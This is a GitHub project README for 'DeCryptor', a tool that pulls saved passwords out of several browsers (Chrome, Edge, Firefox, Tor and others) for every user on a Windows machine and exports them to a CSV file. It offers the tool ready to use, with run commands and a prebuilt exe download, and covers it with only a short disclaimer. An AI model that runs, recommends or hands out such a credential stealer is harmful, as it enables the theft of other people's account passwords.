# DeCryptor
Browser Password Decryption Tool | Chrome Password Decryptor | Edge Password Decryptor | Tor Password Decryptor | 
# Browser Password Extraction Tool 
![image](https://github.com/user-attachments/assets/0f65a92f-1bd9-4aec-9077-43946c3a6274)

This project is a Python-based tool that retrieves and decrypts stored passwords from various web browsers on a Windows machine. The decrypted passwords are saved into a CSV file for further use or analysis.

## Features

- **Browser Support**: Supports popular browsers including:
  - Google Chrome
  - Brave Browser
  - Microsoft Edge
  - Opera
  - Mozilla Firefox
  - Tor Browser

- **Decryption**: Utilizes the browser's encryption mechanisms to decrypt stored passwords.
- **CSV Export**: Saves the output with detailed columns, including the browser, URL, username, password, and system user.

## Requirements

- Python 3.12

### Installing Dependencies

Dependencies are listed in the `requirements.txt` file. To install them, run:
```bash
pip install -r requirements.txt
```

## Usage

1. Clone this repository or download the script.
2. Ensure the dependencies are installed.
3. Run the script:
```bash
python Decrytor.py
```
## 0R
If you are facing errors while installing the required dependencies, you can use [Decrytor exe](https://github.com/str1k3r0p/DeCryptor/releases/download/password-decryptor-v1.0/DeCryptor.exe) file available at [Decryptor Releases](https://github.com/str1k3r0p/DeCryptor/releases/tag/password-decryptor-v1.0)

The exe file will process each browser, system user and instantly output the decrypted passwords to `decrypted_password.csv`.

![image](https://github.com/user-attachments/assets/ff133c2d-2f03-45bc-a517-0835f9d04f59)


### CSV Output Format
| Index | Browser | URL         | Username | Password | System User |
|-------|---------|------------ |----------|----------|-------------|
| 0     | chrome  | example.com | user1    | pass1    | MachineUser |
| 1     | firefox | example.org | user2    | pass2    | MachineUser |
| 2     | edge    | abc.org     | user2    | pass2    | MachineUser |
| 3     | brave   | abc.com     | user2    | pass2    | MachineUser |

## Security Warning
This tool accesses sensitive data and decrypts saved passwords. Use it responsibly and only on systems where you have appropriate permissions. Unauthorized access to personal data may be illegal.

## License
This project is open-source and distributed under the MIT License. Please refer to the LICENSE file for full terms and conditions.

## Disclaimer
The authors are not responsible for any misuse of this tool. It is intended for educational and ethical purposes only.

